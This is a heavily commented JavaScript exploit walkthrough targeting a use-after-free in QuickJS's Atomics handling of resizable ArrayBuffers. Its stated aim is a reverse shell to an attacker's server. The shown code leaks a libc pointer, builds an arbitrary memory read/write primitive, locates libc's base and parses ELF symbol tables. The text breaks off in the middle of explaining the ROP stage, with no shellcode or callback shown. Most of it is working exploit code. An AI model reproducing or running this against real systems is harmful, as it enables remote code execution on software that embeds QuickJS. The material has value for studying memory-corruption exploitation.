/*
 * ============================================================================
 * COMPLETE EXPLOIT WALKTHROUGH: QuickJS Use-After-Free to Remote Shell
 * ============================================================================
 *
 * This exploit demonstrates a complete attack chain against QuickJS, going from
 * a JavaScript use-after-free vulnerability to spawning a remote shell that
 * connects back to an attacker's server.
 *
 * TARGET: QuickJS JavaScript engine (bellard.org/quickjs)
 * VULNERABILITY: CVE-2024-XXXXX - Use-after-free in Atomics + Resizable ArrayBuffer
 * RESULT: Arbitrary code execution with full process privileges
 *
 * PREREQUISITES FOR UNDERSTANDING THIS EXPLOIT:
 * - Basic understanding of C memory layout (heap, stack)
 * - Familiarity with pointers and memory addresses
 * - Basic knowledge of JavaScript typed arrays
 *
 * ============================================================================
 * TABLE OF CONTENTS
 * ============================================================================
 *
 * 1. BACKGROUND: The Vulnerability
 * 2. EXPLOIT STAGE 1: Leak a libc pointer
 * 3. EXPLOIT STAGE 2: Build arbitrary read/write primitive
 * 4. EXPLOIT STAGE 3: Find libc base address
 * 5. EXPLOIT STAGE 4: Parse ELF to find function addresses
 * 6. EXPLOIT STAGE 5: Find ROP gadgets in libc
 * 7. EXPLOIT STAGE 6: Find and corrupt the stack
 * 8. EXPLOIT STAGE 7: Execute shellcode via ROP chain
 *
 * ============================================================================
 * 1. BACKGROUND: THE VULNERABILITY
 * ============================================================================
 *
 * THE BUG (Use-After-Free in Atomics operations):
 * -----------------------------------------------
 * JavaScript's Atomics.store() and Atomics.add() functions have a bug in how
 * they handle the "valueOf" callback. Here's the vulnerable code flow:
 *
 *   1. Atomics.store(typedArray, index, value) is called
 *   2. QuickJS gets a pointer to the typed array's underlying memory buffer
 *   3. QuickJS calls value.valueOf() to convert 'value' to a number
 *   4. QuickJS writes to the memory location from step 2
 *
 * THE PROBLEM: If valueOf() resizes the underlying ArrayBuffer, the memory
 * buffer is reallocated (moved to a new address) and the old memory is FREED.
 * But QuickJS still has the OLD pointer from step 2, and writes to it in step 4.
 * This is a "use-after-free" (UAF) vulnerability.
 *
 * WHAT IS "RESIZABLE ARRAYBUFFER" (RAB)?
 * -------------------------------------
 * ES2024 added Resizable ArrayBuffer - an ArrayBuffer that can change size:
 *
 *   let rab = new ArrayBuffer(100, { maxByteLength: 1000 });
 *   rab.resize(50);  // Shrinks to 50 bytes
 *   rab.resize(200); // Grows to 200 bytes
 *
 * When you resize, glibc's realloc() is called, which may:
 * - Shrink in place (for small decreases)
 * - Allocate a NEW buffer, copy data, FREE the old one (for large changes)
 *
 * WHY THIS IS EXPLOITABLE:
 * ------------------------
 * After realloc() frees memory, that memory goes into glibc's "free lists".
 * The freed chunk contains METADATA - pointers that glibc uses to manage free
 * memory. If we can READ from freed memory, we can leak these pointers.
 * If we can WRITE to freed memory, we can corrupt objects that get allocated
 * in the same location.
 *
 * WHAT IS glibc's HEAP?
 * --------------------
 * glibc malloc manages memory using "chunks". Each chunk has metadata:
 *
 *   +------------------+
 *   | prev_size        |  <- Size of previous chunk (if free)
 *   +------------------+
 *   | size | flags     |  <- Size of this chunk + status bits
 *   +------------------+
 *   | fd (fwd pointer) |  <- When FREE: pointer to next free chunk
 *   +------------------+
 *   | bk (back pointer)|  <- When FREE: pointer to previous free chunk
 *   +------------------+
 *   | user data...     |  <- When ALLOCATED: your data goes here
 *   +------------------+
 *
 * For large free chunks (>= 1024 bytes on 64-bit), glibc links them into
 * "unsorted bins" using the fd/bk pointers. These pointers point into
 * libc's data section - giving us a libc address if we can read them!
 *
 * WHAT IS libc?
 * ------------
 * libc (glibc on Linux) is the C standard library. Every program uses it for:
 * - Memory allocation (malloc, free)
 * - File I/O (open, read, write)
 * - System calls (mprotect, execve)
 *
 * libc is loaded at a random address due to ASLR (Address Space Layout
 * Randomization). To call libc functions, we need to find where it's loaded.
 *
 * EXPLOIT STRATEGY OVERVIEW:
 * -------------------------
 * 1. Trigger UAF to READ freed memory -> leak libc pointer
 * 2. Trigger UAF to WRITE freed memory -> corrupt a TypedArray object
 * 3. Use corrupted TypedArray to read/write arbitrary memory
 * 4. Find libc base by scanning for ELF header
 * 5. Parse libc's ELF to find mprotect() and environ addresses
 * 6. Read environ to find stack address
 * 7. Find saved return address on stack
 * 8. Write shellcode to executable memory
 * 9. Overwrite return address with ROP chain to run shellcode
 * 10. When function returns, our code executes!
 *
 * ============================================================================
 */

'use strict';

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/*
 * JavaScript BigInts can be arbitrarily large. For memory addresses, we need
 * exactly 64-bit unsigned integers. This mask ensures we stay in that range.
 *
 * 1n << 64n = 2^64 = 18446744073709551616
 * Subtracting 1 gives us: 0xFFFFFFFFFFFFFFFF (all bits set)
 *
 * Example: u64(-1n) returns 0xFFFFFFFFFFFFFFFFn (the max 64-bit value)
 */
const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }

/*
 * Memory addresses are often required to be "aligned" to 8-byte boundaries.
 * This means the address must be divisible by 8 (last 3 bits are zero).
 *
 * Examples:
 *   align8(1) = 8
 *   align8(7) = 8
 *   align8(8) = 8
 *   align8(9) = 16
 *
 * Why alignment matters: CPUs access memory most efficiently when data is
 * aligned. Misaligned access can cause crashes or performance penalties.
 *
 * How it works: (n + 7) rounds up, then ~7 (binary: ...11111000) clears
 * the low 3 bits, giving us the next multiple of 8.
 */
function align8(n) { return (n + 7) & ~7; }

// ============================================================================
// EXPLOIT STAGE 1: LEAK A LIBC POINTER
// ============================================================================

/*
 * This function exploits the Atomics use-after-free to read freed heap memory,
 * which contains a pointer into glibc's data section.
 *
 * HEAP MEMORY LAYOUT AFTER OUR MANIPULATION:
 * ==========================================
 *
 * Initial state - we allocate a 0x3000 byte buffer:
 *
 *   +----------------+ <- rab.data (malloc'd region)
 *   | 0x3000 bytes   |
 *   | of user data   |
 *   +----------------+ <- end of our buffer
 *   | consume buffer |    (0x18000 bytes, prevents merging with top)
 *   +----------------+
 *   | after buffer   |    (0x18000 bytes, another buffer)
 *   +----------------+
 *
 * After resize(0x20) shrinks the buffer:
 *
 *   +----------------+ <- rab.data (now only 0x20 bytes)
 *   | 0x20 bytes     |
 *   +----------------+
 *   | FREE CHUNK     |    <- This is the "remainder" - 0x2FE0 bytes freed!
 *   | +------------+ |
 *   | | prev_size  | |    <- Not used (prev chunk is in use)
 *   | +------------+ |
 *   | | size=0x2FE1| |    <- Size with PREV_INUSE flag (0x2FE0 | 1)
 *   | +------------+ |
 *   | | fd pointer | |    <- Points into libc (unsorted bin head)
 *   | +------------+ |
 *   | | bk pointer | |    <- Points into libc (unsorted bin head)  <- WE READ THIS
 *   | +------------+ |
 *   +----------------+
 *   | consume buffer |
 *   +----------------+
 *
 * The freed remainder chunk is linked into glibc's "unsorted bin", which is
 * a doubly-linked list. The fd and bk pointers point to a structure in libc:
 * main_arena.bins[0], which contains the head of the unsorted bin list.
 *
 * WHY INDEX 7 (bk POINTER)?
 * -------------------------
 * The freed chunk structure has this layout:
 *
 *   offset 0x00: prev_size (8 bytes) - size of previous chunk
 *   offset 0x08: size (8 bytes) - size of this chunk + flags
 *   offset 0x10: fd (8 bytes) - forward pointer to next free chunk
 *   offset 0x18: bk (8 bytes) - backward pointer to previous free chunk
 *
 * OFFSET CALCULATION:
 * - Our typed array starts at the buffer's data pointer
 * - Index 7 = offset 7 * 8 = 0x38 bytes (56 bytes) from buffer start
 * - After resize(0x20), the shrunk buffer is 0x20 bytes
 * - The "remainder" chunk (freed portion) starts at offset 0x20
 * - Index 7's offset (0x38) is 0x38 - 0x20 = 0x18 bytes into the freed chunk
 * - Offset 0x18 in a freed chunk is the bk (back) pointer!
 *
 * For unsorted bin chunks, both fd and bk point to main_arena (in libc's data
 * section). Reading either gives us a libc address we can use to find libc's base.
 */
function leak_libc_ptr() {
  /*
   * Create a Resizable ArrayBuffer of 0x3000 bytes (12288 bytes).
   * The maxByteLength allows resize() up to this limit.
   *
   * This size is chosen because:
   * 1. It's large enough that the freed remainder goes into unsorted bin
   *    (glibc puts chunks >= 1024 bytes into unsorted bin, not tcache)
   * 2. Unsorted bin chunks have fd/bk pointers to libc's main_arena
   */
  let rab = new ArrayBuffer(0x3000, { maxByteLength: 0x3000 });

  /*
   * HEAP GROOMING: Allocate buffers to control heap layout.
   *
   * "Heap grooming" (or "heap shaping") means arranging the heap into a
   * predictable state. Without this, the freed remainder might coalesce
   * with the "top chunk" (wilderness) and we wouldn't get libc pointers.
   *
   * The "top chunk" is the large free region at the end of the heap.
   * If our freed chunk is adjacent to it, they merge, and no fd/bk pointers
   * are written (top chunk doesn't need them - it's already at the end).
   *
   * By allocating these buffers, we ensure other chunks exist after our
   * buffer, preventing the merge.
   *
   * The 0x18000 size (98304 bytes) is large enough to ensure isolation.
   */
  let consume = new ArrayBuffer(0x18000);
  let after = new ArrayBuffer(0x18000);

  /*
   * This line is a "side effect" trick to prevent the JavaScript engine
   * from optimizing away our allocations. The XOR will never equal 0xdeadbeef
   * (since both lengths are the same), but the engine can't prove that at
   * compile time, so it must keep the allocations.
   *
   * Without this, a smart JIT compiler might eliminate 'consume' and 'after'
   * since they're never used, defeating our heap grooming.
   */
  if ((consume.byteLength ^ after.byteLength) === 0xdeadbeef) throw 0;

  /*
   * Create a BigInt64Array "view" of the resizable buffer.
   * This typed array provides 64-bit integer access to the underlying memory.
   * Each element is 8 bytes, so index N accesses bytes [N*8, N*8+7].
   *
   * BigInt64Array (vs BigUint64Array): We use signed because Atomics.add
   * expects this type. The actual bit patterns are the same.
   */
  let ta = new BigInt64Array(rab);

  /*
   * THE EXPLOIT TRIGGER: An object with a malicious valueOf() method.
   *
   * JavaScript allows operator overloading via valueOf(). When Atomics.add()
   * needs to convert our object to a number, it calls valueOf().
   *
   * THE BUG: QuickJS gets the memory pointer BEFORE calling valueOf().
   * Our valueOf() resizes the buffer, freeing the memory. But QuickJS
   * still uses the old pointer.
   *
   * Sequence of events:
   * 1. Atomics.add(ta, 7, evil) is called
   * 2. QuickJS computes ptr = &ta.buffer[7*8] = pointer to index 7
   * 3. QuickJS calls evil.valueOf() to get the addend
   * 4. valueOf() calls rab.resize(0x20), which:
   *    a. Calls realloc(rab.data, 0x20)
   *    b. For large shrinks, this frees the old memory
   *    c. glibc writes fd/bk pointers into the freed chunk
   * 5. valueOf() returns 0n
   * 6. QuickJS reads value at ptr (now freed memory containing libc ptr!)
   * 7. QuickJS adds 0n to it and returns the original value
   *
   * We get back the bk pointer from the freed chunk!
   */
  let evil = { valueOf() { rab.resize(0x20); return 0n; } };

  /*
   * INDEX 7 EXPLAINED:
   * -----------------
   * Index 7 * 8 bytes/element = offset 0x38 (56 bytes) from buffer start.
   *
   * After resize(0x20), the first 0x20 bytes may still be valid (shrunk buffer),
   * but bytes at offset 0x20 and beyond are now in freed heap memory.
   *
   * The freed chunk's bk pointer is at a specific offset within the chunk.
   * Through experimentation (or calculation), index 7 lands on the bk field.
   *
   * Atomics.add reads the current value, adds our value (0n), and returns
   * the original. So we get the libc pointer without modifying it.
   *
   * u64() ensures we get an unsigned 64-bit value (addresses are unsigned).
   */
  return u64(Atomics.add(ta, 7, evil));
}

// ============================================================================
// EXPLOIT STAGE 2: ARBITRARY READ/WRITE PRIMITIVE
// ============================================================================

/*
 * This function exploits the SAME vulnerability but for a different purpose:
 * instead of reading freed memory, we WRITE to it to corrupt a TypedArray.
 *
 * GOAL: Create a BigUint64Array whose internal data pointer we control.
 * With a controlled pointer, we can read/write ANYWHERE in memory.
 *
 * QUICKJS INTERNALS - JSObject STRUCTURE:
 * ======================================
 * In QuickJS, every JavaScript object is represented by a C struct JSObject.
 * For TypedArrays (like BigUint64Array), the structure includes:
 *
 *   struct JSObject {
 *     // ... header fields (GC info, flags, class_id) ...
 *     JSShape *shape;           // Property structure
 *     JSProperty *prop;         // Properties array
 *     union {
 *       // For TypedArrays:
 *       struct {
 *         union {
 *           struct JSTypedArray *typed_array;  // Metadata about the view
 *         } u1;
 *         union {
 *           void *ptr;    // <-- DIRECT POINTER TO DATA BUFFER
 *         } u;
 *       } array;
 *     } u;
 *   };
 *
 * The key field is u.array.u.ptr - this is a RAW POINTER to the underlying
 * memory buffer. If we can overwrite this pointer, the TypedArray will
 * read/write from whatever address we specify!
 *
 * ATTACK STRATEGY:
 * ---------------
 * 1. Allocate a 0x70 byte Resizable ArrayBuffer + TypedArray view
 * 2. Shrink to 0x20 bytes, creating a 0x50 byte freed remainder
 * 3. During shrink, allocate a NEW BigUint64Array (the "victim")
 * 4. glibc reuses the 0x50 byte freed chunk for the victim's JSObject
 * 5. Our stale Atomics.store() writes to freed memory = writes into victim!
 * 6. We overwrite victim's u.array.u.ptr field with our chosen address
 * 7. victim[0] now reads/writes from our address!
 *
 * SIZE CALCULATIONS:
 * -----------------
 * - Initial RAB: 0x70 bytes (112 bytes)
 * - After resize(0x20): 0x50 byte remainder freed (80 bytes)
 * - JSObject for BigUint64Array fits in 0x50 byte chunk
 * - Index 13 * 8 = 0x68 offset into original buffer
 * - This lands on the u.array.u.ptr field within the JSObject
 */
function make_arb_u64_view(base_addr, byte_len) {
  /*
   * Align the length to 8 bytes. TypedArray lengths should be aligned
   * to avoid issues with partial reads at the end.
   */
  byte_len = align8(byte_len);

  /*
   * Create a backing buffer for our "victim" TypedArray.
   * This is the INTENDED buffer - but we'll corrupt the pointer
   * so victim reads/writes from base_addr instead!
   */
  let backing = new ArrayBuffer(byte_len);
  let victim = null;  // Will hold our corrupted TypedArray

  /*
   * The Resizable ArrayBuffer we'll use to trigger the UAF.
   * 0x70 bytes chosen so the remainder (0x50) is the right size
   * for a JSObject allocation.
   */
  let rab = new ArrayBuffer(0x70, { maxByteLength: 0x70 });
  let ta = new BigInt64Array(rab);

  /*
   * HEAP NOISE: Allocate small buffers to stabilize heap state.
   *
   * WHAT IS TCACHE?
   * --------------
   * glibc has a "thread cache" (tcache) - a per-thread cache of recently
   * freed chunks. Allocations check tcache first (fast!) before falling
   * back to the main heap. Each size class has a tcache bin holding up
   * to 7 chunks by default.
   *
   * When we resize and create the victim, we want the victim's JSObject
   * to land in our freed 0x50 byte chunk. Heap noise helps by:
   * 1. Filling up tcache bins so our freed chunk stays in the main heap
   * 2. Creating predictable allocation patterns
   *
   * 0x40 bytes (64) is a common small chunk size. 16 allocations
   * is enough to fill and overflow the tcache bin.
   */
  let noise = [];
  for (let i = 0; i < 16; i++) noise.push(new ArrayBuffer(0x40));

  /*
   * THE WRITE EXPLOIT: valueOf() that corrupts the victim's pointer.
   *
   * Timeline:
   * 1. Atomics.store(ta, 13, evil) begins
   * 2. QuickJS gets ptr = address of ta[13] (offset 0x68 in buffer)
   * 3. QuickJS calls evil.valueOf()
   * 4. valueOf():
   *    a. rab.resize(0x20) frees 0x50 bytes starting at offset 0x20
   *    b. new BigUint64Array(backing) allocates a JSObject
   *    c. glibc gives the JSObject the freed 0x50 byte chunk!
   *    d. victim's u.array.u.ptr field is at some offset in this chunk
   *    e. We return base_addr as the value to store
   * 5. Atomics.store writes base_addr to ptr (which is now inside victim!)
   * 6. victim's data pointer is now base_addr
   * 7. victim[0] reads from base_addr, victim[0] = x writes to base_addr!
   */
  let evil = {
    valueOf() {
      rab.resize(0x20);
      victim = new BigUint64Array(backing);
      return base_addr;
    }
  };

  /*
   * INDEX 13 EXPLAINED:
   * ------------------
   * Index 13 * 8 = 0x68 (104 bytes offset).
   *
   * The freed chunk starts at offset 0x20 (32 bytes) in our original buffer.
   * Offset 0x68 is 0x68 - 0x20 = 0x48 (72 bytes) into the freed chunk.
   *
   * The victim's JSObject is allocated in this freed chunk.
   * Offset 0x48 within the JSObject corresponds to u.array.u.ptr field.
   *
   * (These offsets depend on QuickJS struct layouts and may vary by version)
   */
  Atomics.store(ta, 13, evil);

  /*
   * Safety check: ensure valueOf() executed and created victim.
   * This would fail if the timing/allocation patterns didn't line up.
   */
  if (victim === null) throw new Error('arb view failed');

  /*
   * Return the corrupted view along with metadata.
   * - backing: the original intended buffer (not used for data anymore)
   * - victim: our corrupted TypedArray that reads from base_addr
   * - base: the base address for index calculations
   */
  return { backing, victim, base: base_addr };
}

/*
 * READ PRIMITIVE: Read a 64-bit value from any memory address.
 *
 * Our corrupted victim TypedArray thinks its buffer starts at view.base.
 * To read from address 'addr':
 *   - Calculate index: (addr - base) / 8 (since each element is 8 bytes)
 *   - Read victim[index]
 *
 * EXAMPLE: If view.base = 0x7f0000000000 and we want to read 0x7f0000000100:
 *   - index = (0x100) / 8 = 32
 *   - return victim[32]
 */
function read_u64(view, addr) {
  let idx = Number((addr - view.base) >> 3n);  // >> 3n is divide by 8
  return u64(view.victim[idx]);
}

/*
 * READ 32-BIT VALUE: Read a 4-byte value from any address.
 *
 * Our view only supports 8-byte aligned reads. For unaligned 4-byte reads:
 * 1. Read the containing 8-byte value (aligned address)
 * 2. Shift to get the right 4 bytes
 *
 * Example: Reading 4 bytes from address 0x1004:
 * - Aligned address: 0x1000 (mask off low 3 bits)
 * - Read 8 bytes from 0x1000
 * - Shift right by (0x1004 - 0x1000) * 8 = 32 bits
 * - Mask to 32 bits
 */
function read_u32(view, addr) {
  let a = addr & ~7n;  // Align down to 8-byte boundary
  let w = read_u64(view, a);  // Read 8 bytes
  let sh = Number((addr - a) * 8n);  // Bit shift amount
  return Number((w >> BigInt(sh)) & 0xffffffffn);  // Extract 32 bits
}

/*
 * READ 16-BIT VALUE: Same strategy as read_u32, but extract 2 bytes.
 */
function read_u16(view, addr) {
  let a = addr & ~7n;
  let w = read_u64(view, a);
  let sh = Number((addr - a) * 8n);
  return Number((w >> BigInt(sh)) & 0xffffn);
}

/*
 * READ 8-BIT VALUE: Same strategy, extract single byte.
 */
function read_u8(view, addr) {
  let a = addr & ~7n;
  let w = read_u64(view, a);
  let sh = Number((addr - a) * 8n);
  return Number((w >> BigInt(sh)) & 0xffn);
}

/*
 * READ C STRING: Read a null-terminated string from memory.
 *
 * C strings end with a zero byte. We read byte by byte until we hit
 * the null terminator or reach maxLen.
 *
 * This is used to read symbol names from libc's string table.
 */
function read_cstring(view, addr, maxLen) {
  let s = '';
  for (let i = 0; i < maxLen; i++) {
    let c = read_u8(view, addr + BigInt(i));
    if (c === 0) break;  // Null terminator
    s += String.fromCharCode(c);
  }
  return s;
}

// ============================================================================
// EXPLOIT STAGE 3: FIND LIBC BASE ADDRESS
// ============================================================================

/*
 * Find the base address of libc by scanning backwards from a known libc pointer.
 *
 * WHY WE NEED THE BASE ADDRESS:
 * ----------------------------
 * Our leaked pointer points somewhere INSIDE libc, but we don't know exactly
 * where. To find function addresses, we need the BASE address (where libc
 * starts in memory). All function offsets are relative to this base.
 *
 * ASLR (Address Space Layout Randomization) loads libc at a random address
 * each time. But libc is always loaded on a PAGE BOUNDARY (4096-byte aligned).
 * And the first page always starts with the ELF MAGIC NUMBER.
 *
 * ELF MAGIC NUMBER:
 * ----------------
 * Every ELF file (executables, shared libraries) starts with these 4 bytes:
 *   0x7f 'E' 'L' 'F'  =  0x7f454c46  (little-endian: 0x464c457f)
 *
 * ALGORITHM:
 * ---------
 * 1. Align leaked pointer down to page boundary (clear low 12 bits)
 * 2. Scan backwards in 4KB increments
 * 3. At each page, check if first 4 bytes are ELF magic
 * 4. If found, that's the libc base!
 *
 * We scan up to 8MB backwards. libc is typically 2-3MB, so this is enough.
 */
function find_libc_base_from_ptr(leak) {
  const scan = 0x800000;  // 8MB search range

  /*
   * Align to page boundary. Pages are 4KB (0x1000 bytes).
   * ~0xfff = 0xfffffffffffff000 (clear low 12 bits)
   */
  let leak_page = leak & ~0xfffn;
  let start = leak_page - BigInt(scan);

  /*
   * Create a view covering our search range.
   * We need to read from 'start' to 'leak_page'.
   */
  let mem = make_arb_u64_view(start & ~7n, scan + 0x2000);

  /*
   * Scan backwards from the leaked pointer towards lower addresses.
   * Check every page (4KB boundary) for the ELF magic number.
   */
  for (let off = scan; off >= 0; off -= 0x1000) {
    let w = mem.victim[off >> 3];  // Read 8 bytes at this page start

    /*
     * Check low 4 bytes for ELF magic: 0x464c457f (little-endian)
     * 0x7f 'E' 'L' 'F' in memory appears as this 32-bit value
     */
    if ((w & 0xffffffffn) === 0x464c457fn)
      return (start + BigInt(off)) & ~0xfffn;  // Found it! Return aligned addr
  }

  return 0n;  // Not found
}

// ============================================================================
// EXPLOIT STAGE 4: PARSE ELF TO FIND FUNCTION ADDRESSES
// ============================================================================

/*
 * ELF FILE FORMAT BACKGROUND:
 * ==========================
 *
 * ELF (Executable and Linkable Format) is the standard binary format on Linux.
 * Both executables and shared libraries (like libc.so) use this format.
 *
 * ELF STRUCTURE (simplified):
 * --------------------------
 *
 *   +------------------+ 0x00
 *   | ELF Header       |  - Magic number, architecture, entry point
 *   +------------------+ 0x40 (64-bit)
 *   | Program Headers  |  - Describes memory segments for loading
 *   +------------------+ varies
 *   | Section Headers  |  - Describes sections for linking (optional at runtime)
 *   +------------------+
 *   | .text            |  - Executable code
 *   +------------------+
 *   | .rodata          |  - Read-only data
 *   +------------------+
 *   | .data            |  - Initialized data
 *   +------------------+
 *   | .dynamic         |  - Dynamic linking info (symbols, relocs)
 *   +------------------+
 *   | .dynstr          |  - String table for dynamic symbols
 *   +------------------+
 *   | .dynsym          |  - Dynamic symbol table
 *   +------------------+
 *
 * PROGRAM HEADERS (Phdrs):
 * -----------------------
 * These describe how to load the file into memory. Key types:
 *
 *   PT_LOAD (1): Loadable segment - contains code or data
 *     - p_flags & PF_X: executable (contains code like .text)
 *     - p_flags & PF_W: writable (contains data like .data)
 *
 *   PT_DYNAMIC (2): Dynamic linking information
 *     - Contains pointers to symbol table, string table, etc.
 *
 * Each program header is a struct:
 *   +0x00: p_type   (4 bytes) - Type (PT_LOAD, PT_DYNAMIC, etc.)
 *   +0x04: p_flags  (4 bytes) - Permissions (PF_R|PF_W|PF_X)
 *   +0x08: p_offset (8 bytes) - File offset
 *   +0x10: p_vaddr  (8 bytes) - Virtual address in memory
 *   +0x18: p_paddr  (8 bytes) - Physical address (unused)
 *   +0x20: p_filesz (8 bytes) - Size in file
 *   +0x28: p_memsz  (8 bytes) - Size in memory
 *   +0x30: p_align  (8 bytes) - Alignment
 */

/*
 * Parse ELF64 program headers to find the text (code) segment and dynamic
 * linking segment.
 *
 * We need:
 * - Text segment: where to search for ROP gadgets
 * - Dynamic segment: where to find symbol tables
 */
function parse_elf64_phdrs(base) {
  /*
   * Create a view to read ELF headers. 0x4000 bytes is enough for
   * the ELF header + all program headers.
   */
  let v = make_arb_u64_view(base, 0x4000);

  /*
   * ELF64 header fields:
   *   +0x20: e_phoff (8 bytes) - Program header table offset
   *   +0x36: e_phentsize (2 bytes) - Size of one program header
   *   +0x38: e_phnum (2 bytes) - Number of program headers
   */
  let phoff = read_u64(v, base + 0x20n);    // Offset to program headers
  let phentsz = read_u16(v, base + 0x36n);  // Size of each header (usually 56)
  let phnum = read_u16(v, base + 0x38n);    // Number of headers

  const PT_LOAD = 1;     // Loadable segment
  const PT_DYNAMIC = 2;  // Dynamic linking info
  const PF_X = 1;        // Executable flag

  let text = null;  // Will hold text segment info
  let dyn = null;   // Will hold dynamic segment info

  /*
   * Iterate through all program headers.
   * For each one, check the type and extract relevant info.
   */
  for (let i = 0; i < phnum; i++) {
    let p = base + phoff + BigInt(i * phentsz);  // Address of this header

    // Read program header fields
    let p_type = read_u32(v, p + 0n);      // Segment type
    let p_flags = read_u32(v, p + 4n);     // Permission flags
    let p_vaddr = read_u64(v, p + 0x10n);  // Virtual address
    let p_memsz = read_u64(v, p + 0x28n);  // Memory size

    /*
     * PT_LOAD with PF_X = executable segment = code (.text)
     * This is where we'll search for ROP gadgets.
     */
    if (p_type === PT_LOAD && (p_flags & PF_X))
      text = { vaddr: p_vaddr, memsz: p_memsz };

    /*
     * PT_DYNAMIC = dynamic linking segment
     * Contains symbol table pointers, string table, etc.
     */
    if (p_type === PT_DYNAMIC)
      dyn = { vaddr: p_vaddr, memsz: p_memsz };
  }

  if (!text || !dyn) throw new Error('ELF parse failed');

  /*
   * Return addresses relative to libc base.
   * p_vaddr is an offset from the ELF load base.
   */
  return {
    textStart: base + text.vaddr,
    textEnd: base + text.vaddr + text.memsz,
    dynAddr: base + dyn.vaddr,
    dynSize: dyn.memsz,
  };
}

/*
 * DYNAMIC SECTION PARSING:
 * =======================
 *
 * The dynamic section is an array of tag-value pairs:
 *
 *   struct Elf64_Dyn {
 *     int64_t d_tag;    // Type (DT_SYMTAB, DT_STRTAB, etc.)
 *     uint64_t d_val;   // Value (address or size)
 *   };
 *
 * Key tags for symbol resolution:
 *   DT_SYMTAB (6): Address of symbol table
 *   DT_STRTAB (5): Address of string table
 *   DT_STRSZ (10): Size of string table
 *   DT_SYMENT (11): Size of each symbol entry
 *   DT_HASH (4): Address of symbol hash table (contains symbol count)
 *
 * SYMBOL TABLE (.dynsym):
 * ----------------------
 * Array of Elf64_Sym structures:
 *
 *   struct Elf64_Sym {
 *     uint32_t st_name;   // Index into string table
 *     uint8_t  st_info;   // Type and binding
 *     uint8_t  st_other;  // Visibility
 *     uint16_t st_shndx;  // Section index
 *     uint64_t st_value;  // Symbol value (offset from base)
 *     uint64_t st_size;   // Size of symbol
 *   };
 *
 * To find a function like "mprotect":
 * 1. Iterate through symbol table
 * 2. For each symbol, read st_name (index into string table)
 * 3. Read string from string_table[st_name]
 * 4. If string matches "mprotect", return base + st_value
 */

/*
 * Parse the dynamic section to find symbol and string table addresses.
 */
function parse_dynamic(dynAddr, dynSize) {
  let v = make_arb_u64_view(dynAddr & ~7n, align8(Number(dynSize + 0x1000n)));

  // Dynamic section tag values
  const DT_NULL = 0n;    // Marks end of dynamic section
  const DT_HASH = 4n;    // Symbol hash table (SysV style)
  const DT_STRTAB = 5n;  // String table address
  const DT_SYMTAB = 6n;  // Symbol table address
  const DT_STRSZ = 10n;  // String table size
  const DT_SYMENT = 11n; // Symbol entry size

  let symtab = 0n, strtab = 0n, strsz = 0n, syment = 0n, hash = 0n;

  /*
   * Iterate through dynamic entries (16 bytes each: 8 for tag, 8 for value)
   * until we hit DT_NULL (end marker).
   */
  for (let off = 0n; off < dynSize; off += 16n) {
    let tag = read_u64(v, dynAddr + off);
    let val = read_u64(v, dynAddr + off + 8n);

    if (tag === DT_NULL) break;
    if (tag === DT_SYMTAB) symtab = val;
    if (tag === DT_STRTAB) strtab = val;
    if (tag === DT_STRSZ) strsz = val;
    if (tag === DT_SYMENT) syment = val;
    if (tag === DT_HASH) hash = val;
  }

  if (!symtab || !strtab || !strsz || !syment) throw new Error('dyn parse failed');

  /*
   * Determine number of symbols.
   *
   * SysV hash table format:
   *   +0: nbucket (4 bytes)
   *   +4: nchain (4 bytes) = number of symbols
   *
   * If no hash table, estimate from table sizes.
   */
  let nsyms = 0;
  if (hash !== 0n) {
    let h = make_arb_u64_view(hash & ~7n, 0x1000);
    nsyms = read_u32(h, hash + 4n);  // nchain = symbol count
  } else if (strtab > symtab) {
    // Estimate: symbols between symtab and strtab
    nsyms = Number((strtab - symtab) / syment);
  } else {
    nsyms = 32768;  // Fallback: scan a lot
  }

  return { symtab, strtab, strsz, syment, nsyms };
}

/*
 * Look up a symbol by name in libc's dynamic symbol table.
 *
 * Returns the symbol's address (libc base + offset), or 0 if not found.
 */
function lookup_sym(libcBase, dyn, name) {
  /*
   * Create a view covering symbol table through end of string table.
   * This allows us to read both symbols and their names.
   */
  let start = dyn.symtab & ~7n;
  let end = dyn.strtab + dyn.strsz;
  let v = make_arb_u64_view(start, align8(Number(end - start + 0x2000n)));

  /*
   * Iterate through all symbols.
   * Each symbol is dyn.syment bytes (typically 24 bytes for ELF64).
   */
  for (let i = 0; i < dyn.nsyms; i++) {
    let sym = dyn.symtab + BigInt(i) * dyn.syment;

    // st_name at offset 0: index into string table
    let st_name = read_u32(v, sym + 0n);
    if (st_name === 0) continue;  // Unnamed symbol

    /*
     * OPTIMIZATION: Check first character before reading full string.
     * Most symbols won't match the first character, so this saves time.
     */
    if (read_u8(v, dyn.strtab + BigInt(st_name)) !== name.charCodeAt(0))
      continue;

    // Read full symbol name and compare
    let s = read_cstring(v, dyn.strtab + BigInt(st_name), 256);
    if (s === name) {
      // st_value at offset 8: symbol offset from base
      let st_value = read_u64(v, sym + 8n);
      return libcBase + st_value;  // Return absolute address
    }
  }

  return 0n;  // Symbol not found
}

// ============================================================================
// EXPLOIT STAGE 5: FIND ROP GADGETS IN LIBC
// ============================================================================

/*
 * RETURN-ORIENTED PROGRAMMING (ROP) EXPLAINED:
 * ============================================
 *
 * Modern systems have protections like NX (No-Execute) that prevent us from
 * simply injecting and running shellcode. The stack and heap are not executable.
 *
 * ROP is a technique to bypass NX by reusing existing code in the program.
 * Instead of injecting new code, we chain together small pieces of existing
 * code called "gadgets".
 *
 * WHAT IS A GADGET?
 * ----------------
 * A gadget is a sequence of instructions ending with a RET instruction.
 * When RET executes, it pops an address from the stack and jumps there.
 *
 * Example gadgets:
 *   pop rdi; ret     - Pops stack value into RDI register, then returns
 *   pop rsi; ret     - Pops stack value into RSI register
 *   pop rdx; ret     - Pops stack value into RDX register
 *   ret              - Just returns (used for stack alignment)
 *
 * HOW ROP WORKS:
 * -------------
 * We overwrite the return address with a chain of gadget addresses:
 *
 *   Stack before return:
 *   +------------------+
 *   | saved RBP        |
 *   +------------------+
 *   | return address   | <- We overwrite starting here
 *   +------------------+ <- RSP after function epilogue
 *
 *   Our ROP chain on stack:
 *   +------------------+
 *   | gadget1 addr     | <- First gadget to execute
 *   +------------------+
 *   | value for RDI    | <- Popped by gadget1's "pop rdi"
 *   +------------------+
 *   | gadget2 addr     | <- Second gadget
 *   +------------------+
 *   | value for RSI    | <- Popped by gadget2's "pop rsi"
 *   +------------------+
 *   | mprotect addr    | <- After setting up args, call mprotect
 *   +------------------+
